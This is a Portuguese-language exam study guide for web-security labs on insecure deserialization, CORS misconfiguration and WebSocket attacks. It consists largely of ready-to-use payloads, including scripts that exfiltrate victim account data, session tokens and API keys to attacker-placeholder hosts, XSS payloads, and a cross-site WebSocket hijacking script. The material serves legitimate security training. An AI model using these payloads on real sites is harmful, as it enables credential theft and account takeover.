# Outros

Aqui temos um compilado de vulnerabilidades que provavelmente não estarão no seu exame, mas é bom saber para evitar surpresas.

Possibilidade: $${\color{lightgreen}Baixa}$$.

<br>

## Laboratórios

## Insecure Deserialization

Essa vulnerabilidade tem grande chance de aparecer na terceira etapa, mas na segunda é mais raro de acontecer.

Caso ela apareça, será no sentido do laboratório abaixo.

<br>

**Modifying Serialized Data Types**

Pegue o Cookie em base64, decode-o e altere o username para "administrator".

Troque o tipo do parâmetro `access_token` de "s" para "i":
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

<br>

### CORS

**Basic Origin Reflection**
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```

<br>
<br>

**CORS vulnerability with trusted insecure protocols**

Identifique no código-fonte que os detalhes da conta são requisitados através de uma request AJAX e que contém o cookie de sessão do usuário na resposta.

![image](https://github.com/user-attachments/assets/6caa6278-1879-4f4d-8ee4-e17c1598b7bd)

Teste se a aplicação permite a interação com subdomínios. Se a resposas incluir o header `Access-Control-Allow-Origin` o Origin refltido, o CORS está vulnerável.
```
Origin: http://subdomain.TARGET.NET
```

Em seguida, você precisa achar o XSS no parâmetro `productId` que está subdomínio que o lab contém.

![image](https://github.com/user-attachments/assets/68aa4bd4-cf1d-4ac6-a864-9b832daf4184)

Coloque o código abaixo no servidor de exploit e entregue a vitima para roubar o session token e a chave de API.
```
<script>
    document.location="http://stock.TARGET.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://TARGET.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://EXPLOIT.NET/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

<br>
<br>

**Null Origin Trusted**

Identifique a configuração insegura do CORS ao enviar o header `Origin: null` e chechar que a resposta reflete esse valor.

O payload abaixo pode funcionar para obter a API da conta do administrator:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://TARGET.net/account_api/?EPOCHtime=1679134272000',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://EXPLOIT.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

<br>

### Web Sockets

Aperece na página de **Live Chat**.

<br>

**Manipulating WebSocket Messages to Exploit Vulnerabilities**

Escreva algo no Live Chat. Vá para a aba WebSocket History, selecione a request e envie para o Repeater.

Altere a mensagem com um payload malicioso:
```
<img src=123 onerror=alert()>
```

<br>
<br>

**Manipulating the WebSocket Handshake to Exploit Vulnerabilities**
```
X-Forwarded-For: 1.1.1.1
<img src=1 oNeRrOr=alert`1`>
```

<br>
<br>

**Cross-site WebSocket Hijacking**
```
<script>
    var ws = new WebSocket('wss://your-websocket-url/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```



